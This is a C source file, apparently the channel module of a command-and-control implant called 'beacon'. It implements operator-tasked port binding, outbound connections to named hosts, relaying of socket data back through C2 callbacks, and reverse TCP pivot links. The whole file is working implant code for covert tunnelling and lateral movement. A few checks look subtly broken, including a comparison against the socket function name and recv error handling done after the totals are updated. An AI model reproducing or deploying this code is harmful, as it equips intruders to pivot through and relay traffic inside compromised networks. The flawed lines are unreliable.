#include "pch.h"

#include "channel.h"

#include "beacon.h"
#include "link.h"
#include "network.h"
#include "protocol.h"

typedef struct CHANNEL_ENTRY
{
	int id;
	int state;
	int timeoutPeriod;
	int lastActive;
	int type;
	int port;
	int creationTime;
	SOCKET socket;
	struct CHANNEL_ENTRY* next;
} CHANNEL_ENTRY;

CHANNEL_ENTRY* gChannels;
char* gChannelBuffer;
int gChannelIdCount = 0;

#define CHANNEL_STATE_0 0
#define CHANNEL_STATE_1 1
#define CHANNEL_STATE_2 2
#define CHANNEL_STATE_3 3

#define CHANNEL_TYPE_CONNECT 0
#define CHANNEL_TYPE_LISTEN 1
#define CHANNEL_TYPE_BIND 2
#define CHANNEL_TYPE_TCP_PIVOT 3

BOOL ChannelIsBindValid(short port)
{
	for (CHANNEL_ENTRY* channel = gChannels; channel; channel = channel->next)
	{
		if (channel->state && channel->type == CHANNEL_TYPE_BIND && channel->port == port)
		{
			return TRUE;
		}
	}
	return FALSE;
}

SOCKET ChannelSocketCreateAndBind(const int addr, const short port, const int backlog)
{
	NetworkInit();

	SOCKET sock = socket(AF_INET, SOCK_STREAM, IPPROTO_HOPOPTS);
	if(sock == INVALID_SOCKET)
	{
		return INVALID_SOCKET;
	}

	struct sockaddr_in sockaddr;
	sockaddr.sin_family = AF_INET;
	sockaddr.sin_addr.s_addr = addr;
	sockaddr.sin_port = htons(port);

	int argp = 1; // 1 = non-blocking
	if(ioctlsocket(sock, FIONBIO, &argp) == SOCKET_ERROR
		|| bind(sock, (struct sockaddr*)&sockaddr, sizeof(sockaddr)) == SOCKET_ERROR
		|| listen(sock, backlog) == SOCKET_ERROR)
	{
		closesocket(sock);
		return INVALID_SOCKET;
	}

	return sock;
}

void ChannelAdd(SOCKET socket, int id, int timeoutPeriod, int type, int port, int state)
{
	CHANNEL_ENTRY* newChannel = malloc(sizeof(CHANNEL_ENTRY));
	*newChannel = (CHANNEL_ENTRY){
		.id = id,
		.socket = (HANDLE)socket,
		.state = state,
		.lastActive = 0,
		.creationTime = GetTickCount(),
		.timeoutPeriod = timeoutPeriod,
		.port = port,
		.type = type,
		.next = gChannels
	};

	
	for (CHANNEL_ENTRY* ch = gChannels; ch; ch = (CHANNEL_ENTRY*)ch->next)
		if (ch->id == id)
			ch->state = CHANNEL_STATE_0;

	gChannels = newChannel;
}


long long ChannelGetId()
{
	return 0x4000000 + gChannelIdCount++ % 0x4000000;
}

void ChannelLSocketBind(char* buffer, int length, int ipAddress)
{
	datap parser;
	BeaconDataParse(&parser, buffer, length);
	short port = BeaconDataShort(&parser);
	SOCKET sock = ChannelSocketCreateAndBind(ipAddress, port, 10);
	if (sock == INVALID_SOCKET)
	{
		LERROR("Could not bind to %d", port);
		BeaconErrorD(ERROR_SOCKET_CREATE_BIND_FAILED, port);
		return;
	}

	int newId = ChannelGetId();
	ChannelAdd(sock, newId, 0, CHANNEL_TYPE_BIND, port, CHANNEL_STATE_2);
}

void ChannelLSocketTcpPivot(char* buffer, int length)
{
	datap parser;
	BeaconDataParse(&parser, buffer, length);
	short port = BeaconDataShort(&parser);
	SOCKET sock = ChannelSocketCreateAndBind(INADDR_ANY, port, 10);
	if (sock == INVALID_SOCKET)
	{
		LERROR("Could not bind to %d", port);
		BeaconErrorD(ERROR_SOCKET_CREATE_BIND_FAILED, port);
		return;
	}

	int newId = ChannelGetId();
	ChannelAdd(sock, newId, 0, CHANNEL_TYPE_TCP_PIVOT, port, CHANNEL_STATE_2);
}

void ChannelListen(char* buffer, int length)
{
	datap parser;
	BeaconDataParse(&parser, buffer, length);
	int id = BeaconDataInt(&parser);
	short port = BeaconDataShort(&parser);

	SOCKET sock = ChannelSocketCreateAndBind(INADDR_ANY, port, 1);
	if (sock == INVALID_SOCKET)
	{
		BeaconOutput(CALLBACK_CLOSE, buffer, sizeof(id));
		return;
	}

	ChannelAdd(sock, id, 180000, CHANNEL_TYPE_LISTEN, port, CHANNEL_STATE_2);
}

void ChannelConnect(char* buffer, int length)
{
	datap parser;
	BeaconDataParse(&parser, buffer, length);
	int channelId = BeaconDataInt(&parser);
	short port = BeaconDataShort(&parser);

	int bufferSize = BeaconDataLength(&parser);
	bufferSize = min(bufferSize, 1024 - 1);

	char* b = BeaconDataBuffer(&parser);
	memcpy(buffer, b, bufferSize);
	buffer[bufferSize] = 0;

	NetworkInit();

	SOCKET sock = socket(AF_INET, SOCK_STREAM, IPPROTO_HOPOPTS);
	if (sock == INVALID_SOCKET)
		goto close;

	HOSTENT* lHostent = gethostbyname(buffer);
	if (!lHostent)
		goto close;

	struct sockaddr_in sockaddr;
	memcpy(&sockaddr.sin_addr, lHostent->h_addr, lHostent->h_length);
	sockaddr.sin_family = AF_INET;
	sockaddr.sin_port = htons(port);

	int argp = 1; // 1 = non-blocking
	if (ioctlsocket(sock, FIONBIO, &argp) == SOCKET_ERROR)
		goto close;

	if (connect(sock, (struct sockaddr*)&sockaddr, sizeof(sockaddr)) == SOCKET_ERROR)
		if (WSAGetLastError() != WSAEWOULDBLOCK)
			goto close;

	ChannelAdd(sock, channelId, 30000, CHANNEL_TYPE_CONNECT, 0, CHANNEL_STATE_2);

	return;

	close:
	closesocket(sock);
	BeaconOutput(CALLBACK_CLOSE, buffer, sizeof(channelId));
}

void ChannelClose(char* buffer, int length)
{
	datap parser;
	BeaconDataParse(&parser, buffer, length);
	int channelId = BeaconDataInt(&parser);

	for (CHANNEL_ENTRY* channel = gChannels; channel; channel = channel->next)
	{
		if(channel->state != CHANNEL_STATE_0 && 
			channel->id == channelId &&
			channel->type != CHANNEL_TYPE_BIND)
		{
			channel->state = CHANNEL_STATE_0;
		}
	}
}

void ChannelSend(char* buffer, int length)
{
	datap parser;
	BeaconDataParse(&parser, buffer, length);
	int channelId = BeaconDataInt(&parser);

	for (CHANNEL_ENTRY* channel = gChannels; channel; channel = channel->next)
	{
		if (channel->state == CHANNEL_STATE_1 && channel->id == channelId)
		{
			length = BeaconDataLength(&parser);
			buffer = BeaconDataBuffer(&parser);

			fd_set exceptfds;
			fd_set writefds;
			int timeout = GetTickCount() + 30000;
			struct timeval lTimeval = { 0, 100 };
			while (GetTickCount() < timeout)
			{
				FD_ZERO(&writefds);
				FD_ZERO(&exceptfds);

				FD_SET((SOCKET)channel->socket, &writefds);
				FD_SET((SOCKET)channel->socket, &exceptfds);

				select(0, NULL, &writefds, &exceptfds, &lTimeval);
	
				if (FD_ISSET((SOCKET)channel->socket, &exceptfds))
					break;

				if (FD_ISSET((SOCKET)channel->socket, &writefds))
				{
					int sent = send((SOCKET)channel->socket, buffer, length, 0);
					if (sent != SOCKET_ERROR)
						break;

					if (WSAGetLastError() != WSAEWOULDBLOCK)
						break;

					Sleep(1000);
				}
			}
		}
	}
}

void ChannelLSocketClose(char* buffer, int length)
{
	datap parser;
	BeaconDataParse(&parser, buffer, length);
	short port = BeaconDataShort(&parser);

	for (CHANNEL_ENTRY* channel = gChannels; channel; channel = channel->next)
	{
		if (channel->state != CHANNEL_STATE_0 && channel->port == port)
			if (channel->type == CHANNEL_TYPE_BIND || channel->type == CHANNEL_TYPE_TCP_PIVOT)
				channel->state = CHANNEL_STATE_0;
	}
}

int ChannelReceiveDataInternal(SOCKET socket, char* buffer, int length)
{
	int total = 0;
	while (total < length)
	{
		int received = recv(socket, buffer + total, length - total, 0);
		buffer += received;
		total += received;
		if (received == SOCKET_ERROR)
		{
			shutdown(socket, SD_BOTH);
			closesocket(socket);
			return SOCKET_ERROR;
		}
	}
	return total;
}

int ChannelReceiveData()
{
#define CHANNEL_BUFFER_SIZE 0x100000
	if(!gChannelBuffer)
		gChannelBuffer = malloc(CHANNEL_BUFFER_SIZE);

	if(!gChannels)
		return 0;

	int size = 0;
	int numProcessedChannels = 0;
	for(CHANNEL_ENTRY* channel = gChannels; channel; channel = channel->next)
	{
		if(channel->state != CHANNEL_STATE_1)
			continue;

		*(int*)gChannelBuffer = htonl(channel->id);
		int ioctlresult = ioctlsocket((SOCKET)channel->socket, FIONREAD, &size);

		size = min(size, CHANNEL_BUFFER_SIZE - sizeof(int));

		if(ioctlresult == SOCKET_ERROR)
			goto callback_close;

		if (size)
		{
			int totalReceived = ChannelReceiveDataInternal((SOCKET)channel->socket,
			                                               gChannelBuffer + sizeof(int), size);
			if (totalReceived == SOCKET_ERROR)
				goto callback_close;

			if (totalReceived == size)
			{
				BeaconOutput(CALLBACK_READ, gChannelBuffer, size + sizeof(int));
				numProcessedChannels++;
			}
		}

		continue;

	callback_close:
		channel->state = CHANNEL_STATE_0;
		BeaconOutput(CALLBACK_CLOSE, gChannelBuffer, sizeof(int));
	}

	return numProcessedChannels;
}

void ChannelRemoveAllInactive()
{
	CHANNEL_ENTRY* prev = NULL;
	for (CHANNEL_ENTRY* channel = gChannels; channel; channel = prev->next)
	{
		if (!channel->state)
		{
			if (channel->lastActive != 0)
			{
				if (GetTickCount() - channel->lastActive > 1000)
				{
					if (channel->type == CHANNEL_TYPE_CONNECT)
					{
						shutdown((SOCKET)channel->socket, SD_BOTH);
					}

					if (!closesocket((SOCKET)channel->socket) || channel->type != CHANNEL_TYPE_BIND)
					{
						if (prev == NULL)
						{
							gChannels = channel->next;
							free(channel);
							return;
						}

						prev->next = channel->next;
						free(channel);
						continue;
					}
				}
			}
			else
			{
				channel->lastActive = GetTickCount();
			}
		}
		notClosed:
		prev = channel;
	}
}

void ChannelHandleActivity()
{
	fd_set writefds;
	fd_set exceptfds;
	fd_set readfds;

	int channelId = 0;
	struct timeval timeout = { 0, 100 };
	for (CHANNEL_ENTRY* channel = gChannels; channel; channel = channel->next)
	{
		if (channel->state != CHANNEL_STATE_2)
			continue;

		channelId = htonl(channel->id);

		FD_ZERO(&writefds);
		FD_ZERO(&exceptfds);
		FD_ZERO(&readfds);

		FD_SET((SOCKET)channel->socket, &writefds);
		FD_SET((SOCKET)channel->socket, &exceptfds);
		FD_SET((SOCKET)channel->socket, &readfds);

		select(0, &readfds, &writefds, &exceptfds, &timeout);
		SOCKET sock = (SOCKET)channel->socket;
		if (channel->type == CHANNEL_TYPE_BIND)
		{
			if (FD_ISSET(sock, &readfds))
			{
				sock = accept(channel->socket, NULL, NULL);
				int argp = 1; // 1 = non-blocking
				if (ioctlsocket(sock, FIONBIO, &argp) == SOCKET_ERROR)
				{
					closesocket(sock);
					return;
				}

				channelId = ChannelGetId();
				ChannelAdd(sock, channelId, 180000, CHANNEL_TYPE_CONNECT, 0, CHANNEL_STATE_1);

				formatp locals;
				BeaconFormatAlloc(&locals, 128);
				BeaconFormatInt(&locals, channelId);
				BeaconFormatInt(&locals, channel->port);

				int cbLength = BeaconFormatLength(&locals);
				char* cbData = BeaconFormatOriginal(&locals);
				BeaconOutput(CALLBACK_ACCEPT, cbData, cbLength);

				BeaconFormatFree(&locals);
			}
		} else
		{
			if (channel->type == CHANNEL_TYPE_TCP_PIVOT)
			{
				if (FD_ISSET(sock, &readfds))
				{
					sock = accept(channel->socket, NULL, NULL);
					PROTOCOL protocol;
					ProtocolTcpInit(&protocol, sock);
					LinkAdd(&protocol, channel->port | HINT_PROTO_TCP | HINT_REVERSE);
				}
			} else
			{
				int type;
				if (FD_ISSET(sock, &exceptfds))
				{
					channel->state = CHANNEL_STATE_0;
					type = CALLBACK_CLOSE;
				}
				else if (FD_ISSET(sock, &writefds))
				{
					channel->state = CHANNEL_STATE_1;
					type = CALLBACK_CONNECT;
				}
				else if (FD_ISSET(sock, &readfds))
				{
					sock = accept(channel->socket, NULL, NULL);
					channel->socket = sock;

					if (socket == INVALID_HANDLE_VALUE)
					{
						channel->state = CHANNEL_STATE_0;
						type = CALLBACK_CLOSE;
					}
					else
					{
						channel->state = CHANNEL_STATE_1;
						type = CALLBACK_CONNECT;
					}
					closesocket(sock);
				}
				else if (GetTickCount() - channel->creationTime > channel->timeoutPeriod)
				{
					channel->state = CHANNEL_STATE_0;
					type = CALLBACK_CLOSE;
				}

				BeaconOutput(type, &channelId, sizeof(channelId));
			}
		}
	}
}

void ChannelHandleAll(void)
{
	ChannelHandleActivity();
	DWORD timeout = GetTickCount() + 3500;
	while (ChannelReceiveData() > 0 && GetTickCount() < timeout) {}
	ChannelRemoveAllInactive();
}